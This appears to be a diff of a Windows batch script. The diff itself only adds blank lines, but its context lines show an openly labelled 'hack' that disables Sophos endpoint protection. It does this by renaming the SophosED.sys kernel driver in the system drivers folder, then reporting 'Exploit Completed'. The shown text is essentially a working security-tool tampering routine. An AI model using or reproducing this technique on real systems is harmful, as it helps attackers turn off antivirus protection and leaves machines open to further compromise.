@@ -140,6 +140,7 @@ echo Starting Hack
 if exist "c:\windows\system32\drivers" (
   echo System Directory Found
     
+
   echo Renaming SophosED.sys to SophosED.sys.old
   ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
   
@@ -148,6 +149,7 @@ if exist "c:\windows\system32\drivers" (
   echo Exploit Completed ^| No errors
   pause
   goto menu
+
 
 ) else (
   color 0C
